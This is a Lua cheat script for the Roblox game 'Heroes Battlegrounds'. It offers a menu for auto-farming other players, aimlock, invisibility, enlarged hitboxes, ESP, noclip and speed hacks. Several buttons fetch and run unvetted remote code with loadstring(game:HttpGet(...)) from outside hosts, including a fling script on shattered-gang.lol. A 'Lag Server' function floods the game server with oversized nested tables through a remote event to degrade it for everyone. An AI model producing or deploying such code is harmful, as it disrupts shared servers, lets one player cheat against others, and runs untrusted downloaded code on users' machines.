












































































local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
local Settings = {}

local UI = Material.Load({
     Title = "Heroes Battlegrounds | Legend HandlesYT",
     Style = 1,
     SizeX = 370,
     SizeY = 400,
     Theme = "Light"
})

getgenv().cham = false
getgenv().nameESP = false
getgenv().boxESP = false


getgenv().esp_loaded = false
getgenv().Visibility = false


	
	
local main = UI.New({Title = "Main-Features"})


local SelectMob = {}
for i,v in pairs(workspace.Live:GetChildren()) do 
    if v:IsA("Model") and not table.find(SelectMob, v.Name) then 
        table.insert(SelectMob, v.Name)
    end
end

main.Dropdown({
    Text = "Select Player To Farm",
    Options = SelectMob,
    Callback = function(v)
        Settings["ChosenMob"] = v 
    end
})

main.Toggle({
    Text = "Auto Farm Player",
    Enabled = false,
    Callback = function(v)
        Settings["Autofarm"] = v 
    end
})


main.Slider({
    Text = "Distance From Player",
    Callback = function(v)
        Settings["Distance"] = v
    end,
    Min = -20,
    Max = 20,
    Def = 5
})



main.Slider({
    Text = "Height From Player",
    Callback = function(v)
        Settings["Height"] = v
    end,
    Min = -20,
    Max = 20,
    Def = 5
})




main.Toggle({
	Text = "Auto Attack",
		Callback = function(Value)
		     a = Value
        while a do task.wait()
        pcall(function()

local args = {
    [1] = "LeftClick"
}

game:GetService("Players").LocalPlayer.Character.Main.RemoteEvent:FireServer(unpack(args))

        end)
             end
	end,
	Enabled = false
})


main.Button({
	Text = "Auto Attack Closest Player",
		Callback = function()
	spawn(function()
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

wait(1) -- load character

local char = player.Character
local char_root = char:FindFirstChild("HumanoidRootPart")

mouse.Button1Down:connect(function()
    local nearest_hum = math.huge

    local target_root
    local target_hum

    for i, v in pairs(workspace.Live:GetChildren()) do
        local root = v:FindFirstChild("Torso")
        local hum = v:FindFirstChild("Humanoid")

        if root and hum and v ~= char then
            local mag = (char_root.Position - root.Position).magnitude

            if mag < 40 and mag < nearest_hum then

                local obstructed = false

                local ray = Ray.new(char_root.Position, (root.Position - char_root.Position).unit * 20)

                local part = workspace:FindPartOnRay(ray, char, false, true)

                if part then
                    if part.Parent ~= v then
                        obstructed = true
                    end
                end

                if obstructed == false then
                    nearest_hum = mag
                    target_root = root
                    target_hum = hum
                end
            end
        end
    end

    if target_root and target_hum then
        nearest_hum = math.huge

        local behind = (target_root.CFrame * CFrame.new(0,0,-target_root.Size / 2)).p -- the behind lol

        char_root.CFrame = CFrame.new(behind)

        target_hum:TakeDamage()
    end
end)
end)
spawn(function()
	local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
	CoreGui:SetCore("SendNotification", {
		-- Customizable
		Title = "Autofarm Anything",
		Text = "Go Up To Someting And Just Click!",
		Duration = 7, -- Set the duration to how much you want this to stay
		-- More code in part 2
	})
end)
		    
		    end})


	main.Button({
	Text = "Fling (Press Z On/Off)",
		Callback = function()
_G.KeyCode = "Z"
loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
		end})
	    

	
main.Button({
	Text = "Aimlock (X)",
		Callback = function()
		    print('lock on and off aimbot by yak')

currentMag = 10000000
closestMag = 10000000
currentPlr = nil
plr = game.Players.LocalPlayer
chr = plr.Character
mouse = plr:GetMouse()
   
function lookAt(pos)
workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position,pos)
end

function getNearestPlr()
   currentMag = 10000000
   closestMag = 10000000
   currentPlr = nil
   plr = game.Players.LocalPlayer
   chr = plr.Character
   mouse = plr:GetMouse()
   
   plr = game.Players.LocalPlayer
   for i,v in pairs(game.Players:GetChildren()) do
       if v.Name ~= plr.Name then
           if v.Character ~= nil then
               if v.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                   if plr.Character ~= nil then
                       if plr.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                           currentMag = (plr.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude
                           if currentMag < closestMag then
                               closestMag = currentMag
                               currentPlr = v.Character
                           end
                       end
                   end
               end
           end
       end
   end
end

lockedOn = false
mouse.KeyDown:connect(function(key)
   if key == "x" or key == "X" then
       
       if lockedOn == true then
           lockedOn = false
           print("Locked off because Q pressed")
       else    
           lockedOn = true
           print("Locking on")
       end
       
       getNearestPlr()
       
       if currentPlr ~= nil and lockedOn == true then
           print("Locked onto "..currentPlr.Name.."!")
           while lockedOn == true do
               wait()
               
               lookAt(currentPlr.HumanoidRootPart.Position)
               
               if lockedOn == false then
                   break
               end
               
               if currentPlr == nil then
                   lockedOn = false
                   print('Locked off because plr nil')
                   break
               elseif currentPlr:FindFirstChild("HumanoidRootPart") == nil then
                   print('Locked off because HumanoidRootPart nil')
                   lockedOn = false
                   break
               elseif currentPlr:FindFirstChild("Humanoid") == nil then
                   print('Locked off because Humanoid nil')
                   lockedOn = false
                   break
               elseif currentPlr.Humanoid.Health <= 0 then
                   print('Locked off because enemy plr died')
                   lockedOn = false
                   break
               elseif chr.Humanoid.Health <= 0 then
                   print('Locked off because your plr died!')
                   lockedOn = false
                   break
               end
           end
       else
           print('no players found!')
       end
   end
end)
		    
		    end})



	main.Button({
	Text = "Invisible",
		Callback = function()
local offset = 1100 --how far you are away from your camera when invisible
local LocalPlayer = game.Players.LocalPlayer
local Backpack = LocalPlayer.Backpack
local Character = LocalPlayer.Character
local invisible = false
local grips = {}
local heldTool
local gripChanged
local handle
local weld
function setDisplayDistance(distance)
   for _,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance end end
end
local tool = Instance.new("Tool", Backpack)
tool.Name = "Ghostify [Disabled]"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Equipped:Connect(function() wait()
   if not invisible then
       invisible = true
       tool.Name = "Ghostify [Enabled]"
       if handle then handle:Destroy() end if weld then weld:Destroy() end
       handle = Instance.new("Part", workspace) handle.Name = "Handle" handle.Transparency = 1 handle.CanCollide = false handle.Size = Vector3.new(2, 1, 1)
       weld = Instance.new("Weld", handle) weld.Part0 = handle weld.Part1 = Character.HumanoidRootPart weld.C0 = CFrame.new(0, offset-1.5, 0)
       setDisplayDistance(offset+100)
       workspace.CurrentCamera.CameraSubject = handle
       Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
       Character.Humanoid.HipHeight = offset
       Character.Humanoid:ChangeState(11)
       for _,child in pairs(Backpack:GetChildren()) do if child:IsA("Tool") and child ~= tool then grips[child] = child.Grip end end
   elseif invisible then
       invisible = false
       tool.Name = "Ghostify [Disabled]"
       if handle then handle:Destroy() end if weld then weld:Destroy() end
       for _,child in pairs(Character:GetChildren()) do if child:IsA("Tool") then child.Parent = Backpack end end
       for tool,grip in pairs(grips) do if tool then tool.Grip = grip end end
       heldTool = nil
       setDisplayDistance(100)
       workspace.CurrentCamera.CameraSubject = Character.Humanoid
       Character.Animate.Disabled = false
       Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
       Character.Humanoid.HipHeight = 0
       Character.Humanoid:ChangeState(11)
   end
   tool.Parent = Backpack
end)
Character.ChildAdded:Connect(function(child) wait()
   if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
       heldTool = child
       local lastGrip = heldTool.Grip
       if not grips[heldTool] then grips[heldTool] = lastGrip end
       for _,track in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do track:Stop() end
       Character.Animate.Disabled = true
       heldTool.Grip = heldTool.Grip*(CFrame.new(0, offset-1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
       heldTool.Parent = Backpack
       heldTool.Parent = Character
       if gripChanged then gripChanged:Disconnect() end
       gripChanged = heldTool:GetPropertyChangedSignal("Grip"):Connect(function() wait()
           if not invisible then gripChanged:Disconnect() end
           if heldTool.Grip ~= lastGrip then
               lastGrip = heldTool.Grip*(CFrame.new(0, offset-1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
               heldTool.Grip = lastGrip
               heldTool.Parent = Backpack
               heldTool.Parent = Character
           end
       end)
   end
end)
		end})




local main1 = UI.New({Title = "Player"})




main1.Slider({
    Text = "Hitbox",
    Callback = function(s)
    for i, v in pairs(game.Players:GetPlayers()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
            pcall(function()

                v.Character.HumanoidRootPart.Size = Vector3.new((s),(s),(s))
                v.Character.HumanoidRootPart.Transparency = 0.7
                 v.Character.HumanoidRootPart.Material = "Neon"
             v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
                v.Character.HumanoidRootPart.CanCollide = false
            end)
        end
    end
      
    end,
    Min = 2,
    Max = 100,
    Def = 2
})
   

	main1.Button({
	Text = "(L) Lag Server",
		Callback = function()
		    getgenv().Toggled=false
getgenv().KeyBind="L"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'

--//main

local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end

local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 
 table.insert(spammedtable, {})
 z = spammedtable[1]
 
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 

 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end


bomb(250, 5) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)
		    
		    end})




	main1.Button({
	Text = "FPS Booster",
		Callback = function()
		       for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.Material = "Plastic"
end
end
		    end})
 main1.Toggle({
	Text = "Infinite Jump",
	Callback = function(state)
 if state then
_G.infinjump = true
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
if _G.infinjump then
if k:byte() == 32 then
Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Humanoid:ChangeState("Jumping")
wait(0.1)
Humanoid:ChangeState("Seated")
end
end
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
    else
if _G.infinjump == true then
_G.infinjump = false
else
_G.infinjump = true
end
end
            
	end,
	Enabled = false
})
main1.Slider({
	Text = "WalkSpeed",
	Callback = function(s)
 getgenv().WalkSpeedValue = (s); --set your desired walkspeed here
local Player = game:service'Players'.LocalPlayer;
Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
end)
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
	end,
	Min = 16,
	Max = 300,
	Def = 16
})




main1.Button({
	Text = "Noclip",
		Callback = function()
local Noclip = nil
local Clip = nil

function noclip()
	Clip = false
	local function Nocl()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
					v.CanCollide = false
				end
			end
		end
		wait(0.21) -- basic optimization
	end
	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
end

function clip()
	if Noclip then Noclip:Disconnect() end
	Clip = true
end

noclip() -- to toggle noclip() and clip()
end})



main1.Button({
	Text = "Reset",
		Callback = function()
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
end})


local e = UI.New({
    Title = "Esp"
})
 e.Toggle({
	Text = "Visual",
	Callback = function(Value)
 if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().Visibility = Value
            
	end,
	Enabled = false
})


 e.Toggle({
	Text = "Box ESP",
	Callback = function(Value)
 if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().boxESP = Value
		end,
	Enabled = false
})
 

 e.Toggle({
	Text = "Name ESP",
	Callback = function(Value)
 if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().nameESP = Value
		end,
	Enabled = false
})


e.Toggle({
	Text = "Chams",
	Callback = function(Value)
   if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().cham = Value
		end,
	Enabled = false
})





-- // Credits \\ --
local cred = UI.New({
    Title = "Settings"
})




cred.Button({
	Text = "Mobile Keyboard",
		Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end})

local creators = {
    "YT: Legend Handles",
}

for i,v in pairs(creators) do 
    cred.Button({
        Text = v,
        Callback = function()
            setclipboard(v) 
        end;
    });
end;

spawn(function()
    while wait() do 
        if Settings.Autofarm then 
            pcall(function()
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then 
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) 
                end
                
                for i,v in pairs(workspace.Live:GetChildren()) do
                    if v:IsA("Model") and v.Name == Settings.ChosenMob then 
                        repeat wait() 
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,Settings.Height,Settings.Distance)
local args = {
    [1] = {
        ["Goal"] = "LeftClick"
    }
}

game:GetService("Players").LocalPlayer.Character.Communicate:FireServer(unpack(args))

until not Settings.Autofarm or v:FindFirstChild("Humanoid").Health <= 0
                    end
                end
            end)
        end
    end
end)
